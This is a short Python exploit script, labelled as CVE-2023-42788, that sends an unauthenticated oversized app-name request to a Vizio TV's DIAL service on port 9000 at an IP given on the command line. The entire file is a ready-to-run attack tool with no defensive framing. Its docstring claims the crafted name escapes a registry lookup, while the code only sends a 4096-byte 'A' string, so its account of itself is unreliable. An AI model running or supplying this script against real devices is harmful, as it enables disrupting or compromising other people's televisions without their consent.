#!/usr/bin/env python3
"""CVE-2023-42788 — Vizio DIAL. Unauthenticated DIAL request to :9000 with a
crafted app name that escapes the app registry lookup."""
import sys, urllib.request

def exploit(host, port=9000):
    url = f"http://{host}:{port}/apps/" + "A" * 4096
    try:
        with urllib.request.urlopen(url, timeout=6) as r:
            print(f"[+] CVE-2023-42788 {url[:60]}... -> {r.status}")
            return r.status
    except Exception as e:
        print(f"[-] {e}"); return None

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else: print("usage: cve_2023_42788_vizio_dial.py <tv-ip>")

if __name__ == "__main__":
    main()
